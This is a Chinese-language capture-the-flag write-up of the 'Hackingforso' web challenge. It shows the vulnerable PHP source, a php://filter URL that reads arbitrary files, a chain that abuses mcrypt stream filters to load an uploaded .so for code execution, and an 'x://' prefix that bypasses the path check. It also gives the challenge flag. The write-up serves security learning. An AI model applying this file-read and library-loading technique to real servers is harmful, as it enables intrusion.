# Hackingforso

這題有很明顯的任意讀檔，有擋 `..` 之類的 pattern，但可以用 php filter 繞

`http://hackingforso-01.play.midnightsunctf.se/?file=php://filter/convert.base64-encode/resource=/var/www/html/index.php`

Source code:

```php
<?php
    ini_set("display_errors", TRUE);
    error_reporting(E_ALL);

    ini_set("allow_url_fopen", 0);
    ini_set("allow_url_include", 0);
    error_reporting(E_ALL);

    function nohack($str){
        return preg_replace("/(\.\.+|^\/|^(file|http|https|ftp):)/i", "XXX", $str);
    }

    foreach($_POST as $key => $val){
        $_POST[$key] = nohack($val);
    }
    foreach($_GET as $key => $val){
        $_GET[$key] = nohack($val);
    }
    foreach($_REQUEST as $key => $val){
        $_REQUEST[$key] = nohack($val);
    }

    if(isset($_GET['file'])){
        chdir("/var/www/messages");
        $fp = fopen($_GET['file'], 'r');
        $output = fread($fp, 4096);
        echo "Your encrypted file: <br>\n<pre>".bin2hex($output)."</pre>";
        die();
    }


    if(isset($_POST['key']) && isset($_POST['file'])){
        if(strlen($_POST['file']) > 40960){
            echo "too big file";
            die();
        }
        $iv_size = mcrypt_get_iv_size($_POST['algo'], MCRYPT_MODE_CBC) || 16;
        $key_size = mcrypt_get_key_size($_POST['algo'], MCRYPT_MODE_CBC);
        $iv = mcrypt_create_iv($iv_size, MCRYPT_DEV_URANDOM);
        $_POST['iv'] = $iv;
        $_POST['mode'] = 'cbc';
        $_POST['key'] = str_pad($_POST['key'], $key_size);
        $filename = md5($_SERVER['REMOTE_ADDR']).".".basename($_POST['filetype']);
        $fp = fopen("/var/www/messages/".$filename, 'wb');
        stream_filter_append($fp, 'mcrypt.'.$_POST['algo'], STREAM_FILTER_WRITE, $_POST);
        fwrite($fp, $_POST['file']);
        fclose($fp);
        header('Location: /?file='.$filename);
        die();
    }else{
        ?>

Encrypt your file!<br/>
<form method="POST" action="/">
Filecontents: <textarea name="file"></textarea><br/>
Filetype: <input name="filetype"></input><br/>
Key: <input name="key"></input><br/>
Algorithm: <select name="algo">
        <?php
    $algos = array_unique(mcrypt_list_algorithms());

    foreach($algos as $algo){
        echo "<option value='$algo'>$algo</option><br>\n";
    }
?>
</select>
<input type="submit" />
</form>
<?php } ?>
</html>
```

可以看到，我們可以任意寫檔，但寫的檔案不在 web 目錄下，所以上傳 php 也沒用

加上題目提示要跑 `./flag_dispenser`，所以勢必得 RCE

由題目名稱猜測，這題可能要寫 `.so` 檔，然後去找個方法讓他載入這個 so 檔

最後我的目標放在 `stream_filter_append()` 函數

跟了一下 Source code，沒看到會載入外部函式庫的操作

但是其參數的 mcrypt.xxxx 就很可疑了

他會去載入 mcrypt filter，而這個 filter 核心邏輯在 libmcrypt 這個外部 library 

於是就花了點時間去跟一下

最後果然成功找到一條可以任意載入 so 檔的呼叫鍊

https://github.com/php/php-src/blob/PHP-5.6.4/ext/mcrypt/mcrypt_filter.c#L210

`mcrypt_module_open -> mcrypt_dlopen -> lt_dlopenext -> lt_dlopenadvise -> try_dlopen`

這個 `try_dlopen` 會根據喂進去的 filename 作為 module 開啟

(filename 就是 `mcrypt.xxxx` 的 xxxx)

而 filename 後面會拼接上 `shlib_ext` 作為副檔名

其中這個 `shlib_ext` 在 linux 環境下為 `so`

到此，理論上只要寫一個合法 so 檔，就可指定 filename 讓他載入這個 so 檔，做到 RCE

但還有一個問題是 `algorithm_dir` 不在 `/var/www/messages/` 下面

加上不能用 `..`，所以必須想辦法繞過限制，讓他載入 `/var/www/messages/` 下的 so 檔

而繞過方式其實很簡單，就是用 `x://` 開頭，就能躲過檢查

到此就能成功 RCE

<br>

p.s. 

但其實這題因為我懶得編 so 檔

所以最後我是讀 `/proc/self/map` 時

```
562fa83f6000-562fa8e74000 r-xp 00000000 ca:01 269523                     /usr/local/sbin/php-fpm
562fa9074000-562fa9119000 r--p 00a7e000 ca:01 269523                     /usr/local/sbin/php-fpm
562fa9119000-562fa9125000 rw-p 00b23000 ca:01 269523                     /usr/local/sbin/php-fpm
562fa9125000-562fa9134000 rw-p 00000000 00:00 0
562faa1e0000-562faa3ff000 rw-p 00000000 00:00 0                          [heap]
562faa3ff000-562faa403000 rw-p 00000000 00:00 0                          [heap]
7f999efbd000-7f999f1bd000 r-xp 00000000 ca:01 284231                     /var/www/messages/21db4c2051b8e454d73f7b97664770ef.so
7f999f1bd000-7f999f1be000 r--p 00000000 ca:01 284231                     /var/www/messages/21db4c2051b8e454d73f7b97664770ef.so
7f999f1be000-7f999f1bf000 rw-p 00001000 ca:01 284231                     /var/www/messages/21db4c2051b8e454d73f7b97664770ef.so
7f999f1bf000-7f999f3c0000 r-xp 00000000 ca:01 279464                     /usr/local/lib/libmcrypt/ofb.so
7f999f3c0000-7f999f3c1000 r--p 00001000 ca:01 279464                     /usr/local/lib/libmcrypt/ofb.so
7f999f3c1000-7f999f3c2000 rw-p 00002000 ca:01 279464                     /usr/local/lib/libmcrypt/ofb.so
7f999f3c2000-7f999f5c3000 r-xp 00000000 ca:01 279466                     /usr/local/lib/libmcrypt/rc2.so
7f999f5c3000-7f999f5c4000 r--p 00001000 ca:01 279466                     /usr/local/lib/libmcrypt/rc2.so
...
```

發現別人的 so 檔被載入進來

直接拉那個 so 檔下來做 strings:

```
...
./flag_dispenser > /var/www/messages/hurt_me_plentye124f251ac.txt
...
```

於是就直接撿到現成 flag 惹 

`midnight{i_h@t3_cryPt0_1n_w3b_ch4llz}`





